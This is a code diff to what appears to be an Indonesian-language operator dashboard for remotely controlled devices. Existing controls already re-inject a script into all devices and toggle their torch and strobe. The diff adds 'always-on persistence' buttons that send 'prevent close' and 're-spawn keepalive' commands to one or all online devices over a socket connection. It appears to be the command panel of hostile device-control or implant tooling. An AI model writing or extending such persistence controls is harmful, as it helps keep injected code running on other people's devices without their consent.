@@ -395,6 +395,19 @@
                             <button class="header-btn" onclick="sendCustomNotifyBulk()">Kirim ke Semua</button>
                         </div>
                         <div id="notifyStatus" style="font-size:0.75rem;color:var(--text3);margin-top:8px;"></div>
+                        <hr style="border-color:var(--border);margin:12px 0;">
+                        <p style="font-size:0.82rem;color:var(--text3);margin-bottom:8px;">Always-on persistence (per device).</p>
+                        <div style="display:flex;gap:8px;flex-wrap:wrap;">
+                            <select id="pcDeviceSelect" style="flex:1;padding:6px 10px;border-radius:6px;border:1px solid var(--border);background:var(--bg2);color:var(--text);font-size:0.78rem;">
+                                <option value="">Pilih device...</option>
+                            </select>
+                        </div>
+                        <div style="display:flex;gap:8px;margin-top:6px;flex-wrap:wrap;">
+                            <button class="header-btn" onclick="sendPreventClose()" style="border-color:var(--accent);">Aktifkan Prevent Close</button>
+                            <button class="header-btn" onclick="sendDisablePreventClose()" style="border-color:#ff6b6b;color:#ff6b6b;">Nonaktifkan Prevent Close</button>
+                            <button class="header-btn" onclick="sendRespawnKeepalive()" style="border-color:var(--accent);">Re-spawn Keepalive</button>
+                        </div>
+                        <div id="pcStatus" style="font-size:0.75rem;color:var(--text3);margin-top:8px;"></div>
                     </div>
 
                     <!-- TAB: BULK -->
@@ -408,6 +421,8 @@
                             <button class="header-btn" onclick="bulkRespawn()" style="text-align:left;">Re-inject Script ke Semua</button>
                             <button class="header-btn" onclick="bulkTorch()" style="text-align:left;">Nyalakan Torch Semua Device</button>
                             <button class="header-btn" onclick="bulkStrobe()" style="text-align:left;">Strobe Semua Device</button>
+                            <button class="header-btn" onclick="bulkPreventClose()" style="text-align:left;border-color:var(--accent);">Aktifkan Prevent Close Semua</button>
+                            <button class="header-btn" onclick="bulkRespawnKeepalive()" style="text-align:left;border-color:var(--accent);">Re-spawn Keepalive Semua</button>
                         </div>
                         <div id="bulkStatus" style="font-size:0.75rem;color:var(--text3);margin-top:8px;"></div>
                     </div>
@@ -1553,6 +1568,13 @@
             for (const [id, d] of Object.entries(devices)) {
                 sel.innerHTML += `<option value="${id}">${d.label} (${id.slice(0,8)}...)</option>`;
             }
+            const pcSel = document.getElementById('pcDeviceSelect');
+            if (pcSel) {
+                pcSel.innerHTML = '<option value="">Pilih device...</option>';
+                for (const [id, d] of Object.entries(devices)) {
+                    pcSel.innerHTML += `<option value="${id}">${d.label} (${id.slice(0,8)}...)</option>`;
+                }
+            }
         }
 
         function sendCustomNotify() {
@@ -1577,6 +1599,76 @@
         function sendCustomNotifyBulk() {
             document.getElementById('notifyDeviceSelect').value = '';
             sendCustomNotify();
+        }
+
+        // === PREVENT CLOSE / KEEPALIVE ===
+        function sendPreventClose() {
+            const id = document.getElementById('pcDeviceSelect').value;
+            const statusEl = document.getElementById('pcStatus');
+            if (id) {
+                socket.emit('admin-preventclose', { deviceId: id, state: true });
+                statusEl.textContent = 'Prevent close ON untuk ' + id.slice(0,8) + '...';
+                showToast('Prevent close ON: ' + id.slice(0,8), 'success');
+            } else {
+                let sent = 0;
+                for (const [did, d] of Object.entries(devices)) {
+                    if (d.online) { socket.emit('admin-preventclose', { deviceId: did, state: true }); sent++; }
+                }
+                statusEl.textContent = 'Prevent close ON untuk ' + sent + ' device';
+                showToast('Bulk prevent close ON: ' + sent + ' device', 'success');
+            }
+        }
+
+        function sendDisablePreventClose() {
+            const id = document.getElementById('pcDeviceSelect').value;
+            const statusEl = document.getElementById('pcStatus');
+            if (id) {
+                socket.emit('admin-preventclose', { deviceId: id, state: false });
+                statusEl.textContent = 'Prevent close OFF untuk ' + id.slice(0,8) + '...';
+                showToast('Prevent close OFF: ' + id.slice(0,8), 'info');
+            } else {
+                let sent = 0;
+                for (const [did, d] of Object.entries(devices)) {
+                    if (d.online) { socket.emit('admin-preventclose', { deviceId: did, state: false }); sent++; }
+                }
+                statusEl.textContent = 'Prevent close OFF untuk ' + sent + ' device';
+                showToast('Bulk prevent close OFF: ' + sent + ' device', 'info');
+            }
+        }
+
+        function sendRespawnKeepalive() {
+            const id = document.getElementById('pcDeviceSelect').value;
+            const statusEl = document.getElementById('pcStatus');
+            if (id) {
+                socket.emit('admin-respawn-keepalive', id);
+                statusEl.textContent = 'Re-spawn keepalive untuk ' + id.slice(0,8) + '...';
+                showToast('Re-spawn keepalive: ' + id.slice(0,8), 'info');
+            } else {
+                let sent = 0;
+                for (const [did, d] of Object.entries(devices)) {
+                    if (d.online) { socket.emit('admin-respawn-keepalive', did); sent++; }
+                }
+                statusEl.textContent = 'Re-spawn keepalive untuk ' + sent + ' device';
+                showToast('Bulk re-spawn keepalive: ' + sent + ' device', 'info');
+            }
+        }
+
+        function bulkPreventClose() {
+            let sent = 0;
+            for (const [id, d] of Object.entries(devices)) {
+                if (d.online) { socket.emit('admin-preventclose', { deviceId: id, state: true }); sent++; }
+            }
+            document.getElementById('bulkStatus').textContent = 'Prevent close ON untuk ' + sent + ' device';
+            showToast('Bulk prevent close: ' + sent + ' device', 'success');
+        }
+
+        function bulkRespawnKeepalive() {
+            let sent = 0;
+            for (const [id, d] of Object.entries(devices)) {
+                if (d.online) { socket.emit('admin-respawn-keepalive', id); sent++; }
+            }
+            document.getElementById('bulkStatus').textContent = 'Re-spawn keepalive untuk ' + sent + ' device';
+            showToast('Bulk re-spawn keepalive: ' + sent + ' device', 'info');
         }
 
         // === BULK ACTIONS ===
